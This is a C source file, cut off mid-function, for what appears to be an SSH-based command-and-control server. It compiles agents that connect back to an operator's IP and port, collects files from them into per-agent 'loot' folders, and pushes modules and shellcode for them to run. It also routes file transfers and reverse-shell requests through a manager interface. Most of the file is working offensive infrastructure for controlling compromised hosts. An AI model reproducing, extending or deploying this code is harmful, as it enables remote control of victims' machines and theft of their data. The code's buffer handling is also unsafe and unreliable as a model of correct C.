#include "agents.h"
#include "misc.h"
#include "list.h"
#include "authenticate.h"
#include "b64.h"
#include "log.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif

#ifdef WITH_PCAP
const char *pcap_file="debug.server.pcap";
ssh_pcap_file pcap;

void set_pcap(ssh_session session);
void set_pcap(ssh_session session){
	if(!pcap_file)
		return;
	pcap=ssh_pcap_file_new();
	if(ssh_pcap_file_open(pcap,pcap_file) == SSH_ERROR){
		printf("Error opening pcap file\n");
		ssh_pcap_file_free(pcap);
		pcap=NULL;
		return;
	}
	ssh_set_pcap_file(session,pcap);
}

void cleanup_pcap(void);
void cleanup_pcap(){
	ssh_pcap_file_free(pcap);
	pcap=NULL;
}
#endif

ssh_session session_array[MAX_CONN];
pthread_t thread_array[MAX_CONN];
pthread_mutex_t session_lock;
FILE *log_file;
struct clientNode first;
int halt = 0;


#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
    char buff[256];
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            ip = misc_substring(arg, dbg, strlen(arg));
        
            agent_compile(ip, port);
            free(ip);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            id = misc_substring(arg, dbg, strlen(arg));

            agent_register(id, pass);
            sprintf(buff, "Registered agent with %s and %s\n", id, pass);
            free(id);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */


int server_file_download(clientDat *session, char *ptr, int is_manager, char *extra){
    int rc = 0;
    int size = 0;
    int size_e = 0;
    char *data_ptr;
    char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    char logbuff[BUFSIZ];
    FILE *file;


    rc = ssh_channel_write(session->chan, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
        log_info(logbuff);
        return 1;
    }

    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = ssh_channel_read(session->chan, tmpbuffer, sizeof(tmpbuffer), 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
        log_info(logbuff);
        return 1;
    }

    size = atoi(tmpbuffer);
    data_ptr = malloc(size+1);
    memset(data_ptr, 0, size+1);
            
    // writes file size
    rc = ssh_channel_write(session->chan, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
        log_info(logbuff);
        return 1;
    }
    printf("%d\n", size);
    int tmpint = 0;
    while (tmpint < size)
    {
        rc = ssh_channel_read(session->chan, data_ptr+strlen(data_ptr), size-tmpint, 0);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
            log_info(logbuff);
            return 1;
        }
        tmpint += rc;
    
    }
    

    size_e = b64_decoded_size(data_ptr);

    enc_ptr = malloc(size_e);
    if(!b64_decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
        sprintf(logbuff,"%s: failed to decode data\n", session->id);
        log_info(logbuff);
        free(data_ptr);
        free(enc_ptr);
        rc = ssh_channel_write(session->chan, "er", 3);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
            log_info(logbuff);
            return 1;
        }
        return 1;
    }
    free(data_ptr);
            
    // writes file 
    rc = ssh_channel_write(session->chan, "ok", 3);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
        log_info(logbuff);
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), session->id, ptr);
    }
    printf("%s\n", buff);
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}

int server_get_loot(clientDat *manager, char *ptr){
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbf[3];
    int count;
    int ctr;
    int rc;
    int size;
    int size_e;
    DIR *dir;
    FILE *file;
    struct dirent *ent;
    
    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    sprintf(logbuff, "Manager %s: Sending Loot -> %s\n", manager->id, ptr);
    log_info(logbuff);
    
    count = 0;
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
             
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                count++;
            }
        }
    }
    closedir(dir);
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
    memset(name, 0, sizeof(name));
    sprintf(name, "%d", count);
    
    rc = ssh_channel_write(manager->chan, name, strlen(name));
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
        log_info(logbuff);
        return 1;
    }
    
    rc = ssh_channel_read(manager->chan, tmpbf, 3, 0);//rd
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
        log_info(logbuff);
        return 1;
    }

    if(count == 0) return 0;
    
    if ((dir = opendir(buff)) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), ptr, ent->d_name);
                file = fopen(buff, "r");
                
                rc = ssh_channel_write(manager->chan, ent->d_name, strlen(ent->d_name));
                if(rc == SSH_ERROR){
                    sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                    log_info(logbuff);
                    return 1;
                }

                rc = ssh_channel_read(manager->chan, tmpbf, 3, 0); //ok
                if(rc == SSH_ERROR){
                    sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                    log_info(logbuff);
                    return 1;
                }

                if(file == NULL){
                    sprintf(logbuff, "Manager %s: Could not read loot file %s\n", manager->id, buff);
                    log_info(logbuff);
                    perror("");
                    return 2;
                } else {
                    ctr++;
                    memset(buff, 0, sizeof(buff));
                    printf("File opened successfully\n");
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    size_e = b64_encoded_size(size);
                    rewind(file);
                    char *tmp_ptr = malloc(size);
                    memset(tmp_ptr, 0, size);
                    fread(tmp_ptr, 1, size, file);
                    char *tmp_ptr2 = b64_encode((unsigned char*)tmp_ptr, size);
                    free(tmp_ptr);
                    memset(buff, 0, 256);
                    sprintf(buff, "%d", size_e);
                    
                    rc = ssh_channel_write(manager->chan, buff, strlen(buff));
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }

                    rc = ssh_channel_read(manager->chan, tmpbf, 3, 0);//ok
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }
                    
                    rc = ssh_channel_write(manager->chan, tmp_ptr2, strlen(tmp_ptr2));
                    fclose(file);
                    free(tmp_ptr2);

                    if (ctr >= count)
                    {
                        printf("Finished writing loot to channel\n");
                        
                        rc = ssh_channel_write(manager->chan, "fi", 3);
                        if(rc == SSH_ERROR){
                            sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                            log_info(logbuff);
                            return 1;
                        }
                        closedir(dir);
                        break;
                    }                             
                    
                    rc = ssh_channel_write(manager->chan, "nx", 3);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }
                    printf("wrote next\n");
                    
                    rc = ssh_channel_read(manager->chan, tmpbf, 3, 0); //rd
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }
                    printf("Read from channel\n");
                }
            }
        }
        
    } else {
        /* could not open directory */
        perror ("");
        return 2;
    }
    return 0;
}

int server_upload_file(clientDat *agent, char *ptr, int is_module){
    char buff[BUFSIZ];
    char directory[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    int size_e = 0;
    int rc = 0;

    
    memset(buff, 0, sizeof(buff));
    memset(directory, 0, sizeof(directory));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    memset(logbuff, 0, sizeof(logbuff));
    sprintf(logbuff, "Client %s: Sending file -> %s\n", agent->id, ptr);
    log_info(logbuff);
    
    // get filesize 
    sprintf(buff, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
    size = misc_get_file(buff, &file_data);
        
    if(size < 0){
        sprintf(logbuff,"Client %s: filename '%s' does not exist\n", agent->id, buff); 
        log_info(logbuff);
    
        rc = ssh_channel_write(agent->chan, "er", 3);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
            log_info(logbuff);
        }
        return 2;
    }
    
    size_e = b64_encoded_size(size);
    sprintf(tmpbuffer, "%d", size_e);
        
    // writes file size
    rc = ssh_channel_write(agent->chan, tmpbuffer, sizeof(tmpbuffer));
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
        log_info(logbuff);
        return 1;
    }
    
    printf("Tada\n");
    rc = ssh_channel_read(agent->chan, buff, sizeof(buff), 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
        log_info(logbuff);
        return 1;
    }
        
    enc_data = b64_encode((unsigned char *)file_data, size);
        
    // writes file 
    rc = ssh_channel_write(agent->chan, enc_data, size_e);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
        log_info(logbuff);
        return 1;
    }
    memset(tmpbuffer, 0, 8);
    
    printf("dee\n");
    rc = ssh_channel_read(agent->chan, tmpbuffer, 8, 0);
    if(rc == SSH_ERROR){
        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", agent->id, ssh_get_error(agent->session));
        log_info(logbuff);
        return 1;
    }

    
    if(is_module){
        sprintf(logbuff, "Client %s: Execution of module ended with exit code %s\n", agent->id, tmpbuffer);
        log_info(logbuff);
    }
    free(file_data);
    free(enc_data);

    printf("Done with loop\n");
    return 0;

}

int server_get_info(clientDat *manager, char *ptr){
    int size = 0;
    int rc = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char *dat = NULL;
    char tmpbf[3];
    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    if ((dir = opendir ("agents/")) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                file = fopen(name, "r");
                memset(buff, 0, sizeof(buff));
                if(file == NULL){
                    sprintf(logbuff, "Manager %s: Could not get info on agent %s\n", manager->id, ent->d_name);
                    perror("");
                    log_info(logbuff);
                } else {
                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    
                    rc = ssh_channel_write(manager->chan, dat, strlen(dat));
                    free(dat);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }
                    
                    rc = ssh_channel_read(manager->chan, tmpbf, 3, 0);
                    if(rc == SSH_ERROR){
                        sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
                        log_info(logbuff);
                        return 1;
                    }
                }
            }
        }
        rc = ssh_channel_write(manager->chan, "fi", 2);
        if(rc == SSH_ERROR){
            sprintf(logbuff, "Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
            log_info(logbuff);
            return 1;
        }
        closedir (dir);
    } else {
        /* could not open directory */
        sprintf(logbuff, "Manager %s: Failed to open directory: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
        log_info(logbuff);
            
        perror ("");
        return 2;
    }
    return 0;

}

int server_direct_forwarding(ssh_session session)
{
    ssh_channel forwarding_channel;
    int rc;
    char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
    int nbytes, nwritten;
    forwarding_channel = ssh_channel_new(session);
    if (forwarding_channel == NULL) {
        printf("Failed to create forwarding channel\n");
        return SSH_ERROR;
    }
    rc = ssh_channel_open_forward(forwarding_channel,"www.google.com", 80,"localhost", 5555);
    if (rc != SSH_OK)
    {

        printf("Failed to open forwarding channel\n");
        ssh_channel_free(forwarding_channel);
        return SSH_ERROR;
    }
    nbytes = strlen(http_get);
    nwritten = ssh_channel_write(forwarding_channel,http_get,nbytes);
    if (nbytes != nwritten)
    {

        printf("Failed to write to forwarding channel\n");
        ssh_channel_free(forwarding_channel);
        return SSH_ERROR;
    }
  
    ssh_channel_free(forwarding_channel);
    return SSH_OK;
}

void manager_handler(struct clientNode *node){
    clientDat *manager = node->data;
    char resp[2048];

    int operation;
    int rc = 0;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char buff[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char filename[2048];
            

    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        dat_ptr = NULL;

        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, sizeof(resp));
        memset(logbuff, 0, sizeof(logbuff));
        
        rc = ssh_channel_read(manager->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
            log_info(logbuff);
            return;
        }
        
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        sprintf(logbuff, "Manager %s: Operation caught: %d\n", manager->id, operation);
        log_info(logbuff);

        if(*ptr == '\0'){
            sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", manager->id);
            log_info(logbuff);
            ssh_channel_write(manager->chan, "er", 3);
            quitting = 1;
            continue;
        }

        switch (operation)
        {
        case MANAG_EXIT:
            pthread_mutex_lock(&session_lock);
            list_remove_node(node);
            pthread_mutex_unlock(&session_lock);
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            server_get_loot(manager, ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                log_info(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            server_file_download(manager, d_ptr, 1, dat_ptr);
            agent_task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            printf("Manager shell command caught\n");
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                log_info(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            server_file_download(manager, d_ptr, 1, dat_ptr);
            
            agent_task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                log_info(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            agent_task(AGENT_UP_FILE, dat_ptr, d_ptr);
            rc = ssh_channel_write(manager->chan, "ok", 2);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
                log_info(logbuff);
                return;
            }
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                log_info(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            agent_task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            rc = ssh_channel_write(manager->chan, "ok", 2);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
                log_info(logbuff);
                return;
            }
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                log_info(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            agent_compile(dat_ptr, d_ptr);
            dat_ptr = NULL;
            server_upload_file(manager, "out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            server_get_info(manager, ptr);
            break;

        default:
            sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", manager->id, operation); 
            log_info(logbuff);
            rc = ssh_channel_write(manager->chan, "un", 3);
            if (rc == SSH_ERROR)
            {
                sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
                log_info(logbuff);
                return;
            }
            break;
        }
    }
    
}

void agent_handler(struct clientNode *node){
    clientDat *agent = node->data;
    char resp[2048];
    
    int operation;
    int rc = 0;
    int quitting = 0;
    char buff[2048];
    char tmpbuffer[8];
    char *ptr = NULL;
    char filename[2048];
    char logbuff[BUFSIZ];
            
            
    while (!quitting)
    {
        ptr = resp;
        operation = -1;
        rc = 0;
        memset(buff, 0, 2048);
        memset(tmpbuffer, 0, 8);
        memset(filename, 0, 2048);
        memset(resp, 0, sizeof(resp));
        memset(logbuff, 0, sizeof(logbuff));
        
        rc = ssh_channel_read(agent->chan, resp, sizeof(resp), 0);
        if (rc == SSH_ERROR)
        {
            sprintf(logbuff, "Client %s: Failed to handle agent: %s\n", agent->id, ssh_get_error(agent->session));
            log_info(logbuff);
            return;
        }
        
        printf("Requested tasking: %s\n", resp);
        char tmpbf[3] = {0,0,0};
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        sprintf(logbuff, "Client %s: Operation caught: %d\n", agent->id, operation);
        log_info(logbuff);

        if(*ptr == '\0'){
            sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", agent->id);
            log_info(logbuff);
            ssh_channel_write(agent->chan, "er", 3);
            quitting = 1;
            continue;
        }

        switch (operation)
        {
        case AGENT_EXIT:
            printf("Client %s: Client exiting...\n", agent->id); 
            pthread_mutex_lock(&session_lock);
            list_remove_node(node);
            pthread_mutex_unlock(&session_lock);
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", agent->id, ptr);
            server_upload_file(agent, buff, 0);
            break;

        case AGENT_UP_FILE:
            server_file_download(agent, ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            printf("Agent reverse shell caught\n");
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", agent->id, ptr);
            server_upload_file(agent, buff, 1);
            break;

        default:
            sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", agent->id, operation); 
            log_info(logbuff);
            ssh_channel_write(agent->chan, "un", 3);
            break;
        }
    }
}


void client_handler(void* sess){
    struct clientNode *node = (struct clientNode*) sess;
    clientDat *pass = node->data;
    
    ssh_message message;
    int rc = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char beacon[BUFSIZ];
    char tmp_buffer[3];
    char *tasking;
    char logbuff[BUFSIZ];
    memset(logbuff, 0, sizeof(logbuff));
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message=ssh_message_get(pass->session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
					sprintf(logbuff, "Client %s: Got request for opening channel\n", pass->id); 
                    log_info(logbuff);
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        pass->chan=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !pass->chan);
    
	if(!pass->chan){
        sprintf(logbuff, "Client %s: Channel error : %s\n", pass->id, ssh_get_error(pass->session));
        log_info(logbuff);
        ssh_finalize();
        free(pass);
        list_remove_node(node);
        return;
    }
    
	do {
        message=ssh_message_get(pass->session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				printf("Client %s: Got tasking request\n", pass->id);
                msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }
        ssh_message_free(message);
    } while (message);
    
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(pass->chan, tmp_buffer, 2, 0);
            
        if(tmp_buffer[0] == '0'){
            ssh_channel_write(pass->chan, "ok", 2);
        
            sprintf(logbuff, "Manager %s: Caught manager connection\n", pass->id);
            log_info(logbuff);

            manager_handler(node);

        } else {
            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = misc_directory_exists(strcat(buf, pass->id));
        
            if(!exists){
                agent_init(pass->id);
                sprintf(logbuff, "Client %s: Initialized agent\n", pass->id);
                log_info(logbuff);
            }
            rc = ssh_channel_write(pass->chan, "ok", 3);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", pass->id, ssh_get_error(ssh_channel_get_session(pass->chan)));
                log_info(logbuff);
                break;
            }

            rc = ssh_channel_read(pass->chan, beacon, sizeof(beacon), 0);
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: caught ssh error: %s", pass->id, ssh_get_error(ssh_channel_get_session(pass->chan)));
                log_info(logbuff);
                break;
            }
            agent_write_beacon(pass->id, beacon);

            tasking = agent_get_tasking(pass->id);
            if(!tasking){
                sprintf(logbuff, "Client %s: caught ssh error\n", pass->id);
                log_info(logbuff);
                perror("Reason");
                break;
            }
            printf("Tasking being sent: %s\n", tasking);
            // Write tasking
            rc = ssh_channel_write(pass->chan, tasking, strlen(tasking));
            if(rc == SSH_ERROR){
                sprintf(logbuff, "Client %s: Failed to write to channel: %s", pass->id, ssh_get_error(ssh_channel_get_session(pass->chan)));
                log_info(logbuff);
                break;
            }
            // Pass to handler
            agent_handler(node);
        
        }
        
        break;
    default:
        sprintf(logbuff, "Client %s: got unknown message type: %d\n", pass->id, msgType);
        log_info(logbuff);
        break;
    }

    printf("Closing channels...\n");
    ssh_message_free(message);
    ssh_finalize();
    free(pass);
    list_remove_node(node);
    
	
    return;
}

void *handle_conn(void *input){
    int auth=0;
    ssh_message message;
    struct clientNode *current = &first;
    char *name = NULL;
    ssh_session session = (ssh_session)input;
    
    do {
        message=ssh_message_get(session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(authenticate_doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            name = malloc(strlen(ssh_message_auth_user(message)));
                            memset(name, 0, strlen(ssh_message_auth_user(message)));
                            sprintf(name, "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(session);
    }else {
        clientDat *pass = malloc(sizeof(clientDat));
        pass->id = name;
        pass->session = session;
        pass->trans_id = rand();
    
        pthread_mutex_lock(&session_lock);
        while(current->nxt != NULL){
            current = current->nxt;
        }
            
